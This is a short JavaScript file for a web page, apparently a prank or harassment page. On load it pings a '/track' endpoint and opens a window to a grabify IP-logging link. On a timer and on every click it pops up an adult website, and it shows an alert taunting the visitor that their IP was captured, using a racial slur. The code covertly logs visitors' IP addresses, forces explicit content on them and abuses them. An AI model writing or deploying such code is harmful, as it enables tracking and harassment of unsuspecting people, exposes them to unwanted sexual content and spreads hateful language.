window.onload = function() {
  fetch('/track')
      .then(response => response.text())
      .then(data => console.log(data))
      .catch(error => console.error('Error:', error));

  setTimeout(openPopup, 3000)

  setTimeout(makePageClickable, 5000);
};

function openLink() {
  toggleText();
  window.open("https://grabify.link/JXWNOR", "_blank");
}

function toggleText() {
  const hiddenText = document.getElementById("special-text");
  if (hiddenText.style.visibility === "hidden") {
      hiddenText.style.visibility = "visible";
  } else {
      hiddenText.style.visibility = "hidden";
  }
}

function openPopup() {
  const popup = window.open("", "PopupWindow", "width=600,height=400");
  popup.location.href = "https://jerkmate.com/";
  alert('I got your IP lil nigga!');
}

function makePageClickable() {
  document.body.style.cursor = 'pointer'; 
  document.body.addEventListener('click', openPopup);
}
